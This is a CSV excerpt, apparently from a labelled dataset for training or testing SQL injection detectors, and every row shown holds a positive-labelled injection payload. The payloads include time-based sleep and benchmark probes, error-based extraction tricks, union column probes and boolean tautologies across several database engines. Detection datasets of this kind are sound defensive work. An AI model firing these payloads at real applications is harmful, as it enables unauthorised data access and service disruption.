row_index,payload_norm,label,sqli_type_hint
5940,1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',1,
5941,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624",1,
5942,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",1,
5943,"-1174"" union all select 4303,4303,4303,4303#",1,
5944,"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
5945,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",1,
5946,"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",1,
5947,-1217' ) ) ) order by 1#,1,
5948,"iif ( 2205 = 4764,1,1/0 )",1,
5949,"1"" union all select null,null,null,null,null,null,null,null,null#",1,
5950,"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--",1,
5951,"-5148"" ) ) or 5310 = 8229",1,
5952,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,1,
5953,1 ) ) ) and 9198 = 9198--,1,
5954,1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
5955,1'+ ( select 'zugq' where 9218 = 9218,1,
5956,"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",1,
5957,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1,
5958,"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",1,
5959,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5960,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",1,
5961,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1,
5962,"1"" where 7158 = 7158",1,
5963,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5964,1 where 3735 = 3735,1,
5965,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz",1,
5966,"1%"" ) ) and 9198 = 9198--",1,
5967,"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1,
5968,"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",1,
5969,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,1,
